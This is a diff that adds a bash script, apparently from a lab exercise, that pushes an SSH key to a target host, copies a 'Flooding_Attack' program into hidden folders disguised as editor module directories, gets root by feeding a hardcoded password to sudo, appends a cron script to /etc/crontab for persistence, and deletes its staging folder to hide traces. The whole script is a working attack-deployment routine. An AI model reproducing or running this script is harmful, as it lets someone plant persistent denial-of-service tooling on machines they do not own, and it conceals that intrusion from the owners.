@@ -1,0 +1,30 @@
+#!/bin/bash
+ETC="/home/victim/.etc"
+Directory1="/home/victim/.atom/.module/"
+Directory2="/home/victim/.vscode/.module/"
+if [ ! -f ~/.ssh/id_rsa.pub ]; then
+	printf "\n\n" | ssh-keygen -t rsa
+fi
+ssh-copy-id victim@$1
+
+ssh victim@$1<<EOI
+if [ ! -d "$ETC/" ];then
+	mkdir -p "$ETC/"
+fi
+exit
+EOI
+scp ./cron_script victim@$1:"$ETC/"
+scp ./Flooding_Attack victim@$1:"$ETC/"
+ssh victim@$1<<EOI
+if [ ! -d "$Directory1" ]; then
+	mkdir -p "$Directory1"
+fi
+if [ ! -d "$Directory2" ]; then
+	mkdir -p "$Directory2"
+fi
+cp "$ETC/Flooding_Attack" "$Directory1" 
+cp "$ETC/Flooding_Attack" "$Directory2"
+echo victim | sudo -S bash -c 'cat "$ETC/cron_script" >> /etc/crontab'
+rm -rf "$ETC/"
+exit
+EOI
